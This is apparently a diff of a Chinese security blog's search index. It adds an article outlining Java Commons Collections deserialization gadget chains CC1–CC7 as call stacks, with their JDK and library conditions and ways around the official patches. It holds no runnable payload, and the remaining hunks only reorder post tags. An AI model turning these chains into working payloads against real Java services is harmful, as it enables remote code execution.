memberValues.entrySet().iterator().next().getValue()</span><br><span class="line">      Proxy.invoke() [动态代理调用]</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">            迭代调用链</span><br></pre></td></tr></table></figure><ul><li><a href="LazyMap%E8%B0%83%E7%94%A8%E9%93%BE.md">LazyMap调用链</a></li><li><a href="AnnotationInvocationHandler%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%B0%83%E7%94%A8%E9%93%BE.md">AnnotationInvocationHandler动态代理调用链</a></li></ul><h2 id="CC2-PriorityQueue"><a class="header-anchor" href="#CC2-PriorityQueue">¶</a>CC2 PriorityQueue</h2><p>入口: <code>TransformingComparator#compare</code>核心组件: <code>PriorityQueue</code>, <code>TemplatesImpl</code>条件: jdk无限制, CommonsCollections4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    heapify()</span><br><span class="line">      siftDown()</span><br><span class="line">        siftDownUsingComparator()</span><br><span class="line">          TransformingComparator.compare()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              TemplatesImpl.newTransformer()</span><br><span class="line">                TemplatesImpl.getTransletInstance()</span><br><span class="line">                  TransletClassLoader.defineClass() [加载恶意字节码]</span><br><span class="line">                   恶意类的静态代码块/构造函数执行 [命令执行]</span><br></pre></td></tr></table></figure><ul><li><a href="TemplatesImpl%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8%E9%93%BE.md">TemplatesImpl底层调用链</a></li><li><a href="TransformingComparator.md">TransformingComparator</a></li><li><a href="PriorityQueue.md">PriorityQueue</a></li></ul><h2 id="CC3-TrAXFilter"><a class="header-anchor" href="#CC3-TrAXFilter">¶</a>CC3 TrAXFilter</h2><p>入口: <code>AnnotationInvocationHandler#readObject</code>核心组件: <code>TrAXFilter</code>, <code>TemplatesImpl</code>条件: jdk1.7</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    memberValues.entrySet().iterator().next().getValue()</span><br><span class="line">      Proxy.invoke() [动态代理调用]</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">            ConstantTransformer.transform() [获取TrAXFilter类]</span><br><span class="line">            InstantiateTransformer.transform()</span><br><span class="line">              TrAXFilter构造函数()</span><br><span class="line">                templates.newTransformer() [TemplatesImpl.newTransformer()]</span><br><span class="line">                  TemplatesImpl.getTransletInstance()</span><br><span class="line">                    TransletClassLoader.defineClass() [加载恶意字节码]</span><br><span class="line">                     恶意类的静态代码块/构造函数执行 [命令执行]</span><br></pre></td></tr></table></figure><p>别看很长, 其实是拼接CC1的<code>lazyMap.get() -&gt; InvokerTransformer.transform()</code></p><ul><li><a href="TrAXFilter.md">TrAXFilter</a></li></ul><h2 id="CC4-组合利用"><a class="header-anchor" href="#CC4-组合利用">¶</a>CC4 组合利用</h2><p>入口: <code>TransformingComparator#compare</code>核心组件: <code>PriorityQueue</code>, <code>TrAXFilter</code>条件: CommonsCollections4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    heapify()</span><br><span class="line">      siftDown()</span><br><span class="line">        siftDownUsingComparator()</span><br><span class="line">          TransformingComparator.compare()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">              ConstantTransformer.transform() [获取TrAXFilter类]</span><br><span class="line">              InstantiateTransformer.transform()</span><br><span class="line">                TrAXFilter构造函数()</span><br><span class="line">                  templates.newTransformer() [TemplatesImpl.newTransformer()]</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TransletClassLoader.defineClass() [加载恶意字节码]</span><br><span class="line">                       恶意类的静态代码块/构造函数执行 [命令执行]</span><br></pre></td></tr></table></figure><p>结合CC2的<code>PriorityQueue</code>触发点和CC3的<code>TrAXFilter</code>利用方式</p><ul><li><a href="CC4.md">CC4</a></li></ul><h2 id="CC5-TiedMap"><a class="header-anchor" href="#CC5-TiedMap">¶</a>CC5 TiedMap</h2><p>入口: <code>BadAttributeValueExpException#readObject</code>核心组件: <code>TiedMapEntry</code>, <code>LazyMap</code>条件: 无任何要求，可以直接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  BadAttributeValueExpException.readObject()</span><br><span class="line">    val.toString() [TiedMapEntry.toString()]</span><br><span class="line">      TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">            迭代调用链</span><br></pre></td></tr></table></figure><ul><li><a href="CC5.md">CC5</a></li></ul><h2 id="CC6-hashCode"><a class="header-anchor" href="#CC6-hashCode">¶</a>CC6 hashCode</h2><p>入口: <code>HashMap#hash -&gt; TiedMapEntry#hashCode</code>核心组件: <code>TiedMapEntry</code>, <code>HashMap</code>条件: 无任何要求，可以直接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        TiedMapEntry.hashCode()</span><br><span class="line">          TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">              factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">                迭代调用链</span><br></pre></td></tr></table></figure><ul><li><a href="CC6.md">CC6</a></li></ul><blockquote><p>走urldns反序列化一套</p></blockquote><h2 id="CC7"><a class="header-anchor" href="#CC7">¶</a>CC7</h2><p>入口: <code>Hashtable#reconstitutionPut</code>核心组件: <code>Hashtable</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  Hashtable.readObject()</span><br><span class="line">    Hashtable.reconstitutionPut()</span><br><span class="line">      AbstractMap.equals()</span><br><span class="line">        TiedMapEntry.equals()</span><br><span class="line">          TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">              factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">                迭代调用链</span><br></pre></td></tr></table></figure><blockquote><p>在CC6的基础上多走了一步 HashTable</p></blockquote><ul><li><a href="CC7.md">CC7</a></li></ul><h1>关键链解析</h1><h2 id="CC3链-TrAXFilter与字节码加载"><a class="header-anchor" href="#CC3链-TrAXFilter与字节码加载">¶</a>CC3链-TrAXFilter与字节码加载</h2><p>CC3链的核心目的是绕过一些安全规则对InvokerTransformer类的限制（例如黑名单)</p><p>它不再直接使用<code>InvokerTransformer</code>来调用方法，而是利用了<code>TrAXFilter</code>类; CC3链通过<code>InstantiateTransformer</code>来实例化<code>TrAXFilter</code>类，并传入恶意构造的<code>TemplatesImpl</code>对象，最终在实例化过程中触发<code>TemplatesImpl#newTransformer()</code>，加载并执行其中的恶意字节码; 这使得CC3链更侧重于类加载而非直接的命令执行</p><h2 id="CC6链-hashCode的利用"><a class="header-anchor" href="#CC6链-hashCode的利用">¶</a>CC6链-hashCode的利用</h2><p>CC6链提供了一种非常通用的触发方式; 它通过<code>TiedMapEntry#hashCode()</code>方法触发<code>TiedMapEntry#getValue()</code>, 进而调用<code>LazyMap#get()</code>和后续的<code>Transformer</code>链</p><p>该链的触发点<code>HashMap#hash()</code>在反序列化读取数据时会被调用, 因此<strong>不受JDK版本限制</strong>, 适用性非常广泛</p><h2 id="CC4链-组合利用"><a class="header-anchor" href="#CC4链-组合利用">¶</a>CC4链-组合利用</h2><p>CC4链可以看作是CC2和CC3思想的结合; 它像CC2一样使用<code>PriorityQueue</code>和<code>TransformingComparator</code>作为触发入口, 但像CC3一样使用<code>InstantiateTransformer</code>来实例化<code>TrAXFilter</code>并最终触发<code>TemplatesImpl</code>中的字节码, 从而避免使用可能被禁用的<code>InvokerTransformer</code></p><h1>绕过技术与历史修复</h1><h2 id="JDK版本的绕过"><a class="header-anchor" href="#JDK版本的绕过">¶</a>JDK版本的绕过</h2><p>JDK 8u71+修复了<code>AnnotationInvocationHandler#readObject</code>的逻辑，导致直接依赖它的CC1链失效; 应对策略是寻找新的触发点, 如CC6利用<code>HashMap#hashCode()</code>, CC2/CC4利用<code>PriorityQueue#readObject()</code>中的比较器</p><h2 id="Commons-Collections的修复"><a class="header-anchor" href="#Commons-Collections的修复">¶</a>Commons Collections的修复</h2><p>在3.2.2和4.1版本中, 官方试图修复漏洞;</p><p>例如，在3.2.2版本中，对<code>InvokerTransformer</code>、<code>InstantiateTransformer</code>等类的序列化支持增加了开关</p><p>这些开关默认情况下关闭，反序列化这些类会抛出<code>UnsupportedOperationException</code>异常; 若要启用，需设置系统属性<code>org.apache.commons.collections.enableUnsafeSerialization=true</code></p><p>需要注意的是, 3.2.2版本的修复并不彻底, 因为它只是增加了一个默认关闭的开关, 如果应用程序在启动时启用了不安全的序列化属性, 仍然可能存在风险</p><h1>其他</h1><h2 id="Commons-Collections3和4的区别"><a class="header-anchor" href="#Commons-Collections3和4的区别">¶</a>Commons Collections3和4的区别</h2><p>Commons Collections 3和4是Java编程语言中的开源类库，用于提供更多的集合数据结构和工具类。它们的主要区别如下：</p><p>架构：Commons Collections 4使用了新的架构，通过更好的设计和实现，提高了性能和可用性。</p><p>功能：Commons Collections 4新增了一些功能，例如BloomFilter，MultiValuedMap等。</p><p>兼容性：Commons Collections 4支持Java 8和以上版本，而Commons Collections 3只支持Java 7及以下版本。</p><p>依赖：Commons Collections 4移除了对其他类库的依赖，例如BeanUtils和ComparatorUtils，这使得它更加轻便和易用。</p><p>Commons Collections 4是一个更为现代化和高效的Java集合类库，更适合使用Java 8及以上版本。但如果你仍然需要在Java 7及以下版本中使用，那么Commons Collections 3是一个不错的选择。</p><h2 id="利用链的演变与绕过"><a class="header-anchor" href="#利用链的演变与绕过">¶</a>利用链的演变与绕过</h2><p>JDK版本适配问题JDK 8u71+修复了AnnotationInvocationHandler的触发逻辑，导致CC1链失效。</p><p>替代方案：CC3链：引入TemplatesImpl类，通过字节码加载执行命令。CC6链：改用HashSet和HashMap的hashCode()触发点79。</p><p>Commons Collections的修复与绕过官方修复（3.2.2+）：在InvokerTransformer中增加序列化开关，默认关闭反序列化功能58。绕过手段：使用其他危险类（如InstantiateTransformer）构造新链，或依赖未修复的4.x版本组件</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
             
         </tags>
       
@@ -1190,9 +1265,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1412,9 +1487,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 反弹shell </tag>
             
@@ -1583,9 +1658,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1616,9 +1691,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1647,11 +1722,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
             
             <tag> 工具利用 </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> MySQL </tag>
             
@@ -1682,9 +1757,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> MySQL </tag>
             
@@ -1721,11 +1796,11 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
             
             <tag> 缓冲区溢出 </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1758,11 +1833,11 @@
       
         <tags>
             
+            <tag> Linux </tag>
+            
             <tag> 爆破 </tag>
             
             <tag> 提权 </tag>
-            
-            <tag> Linux </tag>
             
             <tag> msf </tag>
             
@@ -1853,11 +1928,11 @@
       
         <tags>
             
+            <tag> Linux </tag>
+            
             <tag> 爆破 </tag>
             
             <tag> 提权 </tag>
-            
-            <tag> Linux </tag>
             
             <tag> msf </tag>
             
@@ -1886,9 +1961,9 @@
       
         <tags>
             
-            <tag> 提权 </tag>
-            
             <tag> Linux </tag>
+            
+            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1917,11 +1992,11 @@
       
         <tags>
             
+            <tag> Linux </tag>
+            
             <tag> 爆破 </tag>
             
             <tag> 提权 </tag>
-            
-            <tag> Linux </tag>
             
             <tag> msf </tag>
             
@@ -2067,9 +2142,9 @@
             
             <tag> SQL盲注 </tag>
             
-            <tag> 堆叠注入 </tag>
-            
             <tag> sqlmap </tag>
+            
+            <tag> 堆叠注入 </tag>
             
             <tag> SQL预处理 </tag>
             
@@ -2108,9 +2183,9 @@
             
             <tag> SQL盲注 </tag>
             
-            <tag> 堆叠注入 </tag>
-            
             <tag> sqlmap </tag>
+            
+            <tag> 堆叠注入 </tag>
             
         </tags>
       
@@ -2441,9 +2516,9 @@
       
         <tags>
             
-            <tag> 爆破 </tag>
-            
             <tag> 工具利用 </tag>
+            
+            <tag> 爆破 </tag>
             
             <tag> PHP </tag>
             
@@ -3002,9 +3077,9 @@
       
         <tags>
             
-            <tag> 模板 </tag>
-            
             <tag> SSTI </tag>
+            
+            <tag> 模板 </tag>
             
         </tags>
       
